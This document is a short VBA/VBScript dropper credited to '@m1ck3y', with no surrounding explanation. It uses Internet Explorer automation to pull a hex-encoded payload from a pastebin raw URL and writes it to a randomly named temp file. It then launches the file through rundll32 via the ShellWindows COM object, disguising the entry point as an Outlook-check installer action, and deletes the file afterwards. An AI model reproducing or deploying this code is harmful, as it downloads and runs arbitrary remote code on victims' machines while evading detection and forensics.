' @m1ck3y
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "https://pastebin.com/raw/g10EQ6PS"
State = 0
Do Until State = 4: DoEvents: State = ie.readyState: Loop
Dim payload: payload = ie.Document.Body.getElementsByTagName("pre").Item(0).innerHTML
p = Environ("TEMP") & "\CVR" & Int(Rnd * 999) + 1 & "F.tmp.cvr"
 
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(p, True)
 
With objFile: For lp = 1 To Len(payload) Step 2: .Write Chr(CByte("&H" & Mid(payload, lp, 2))): Next: End With: objFile.Close
 
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "rundll32", p & ",zzzzInvokeManagedCustomActionOutOfProc SfxCA_25158221 64 CustomAction_OutlookCheck!CustomAction_OutlookCheck.CustomActions.OutlookCheck", "", Null, 0
Dim dt: dt = DateAdd("s", 3, Now()): Do Until (Now() > dt): Loop
objFSO.DeleteFile p
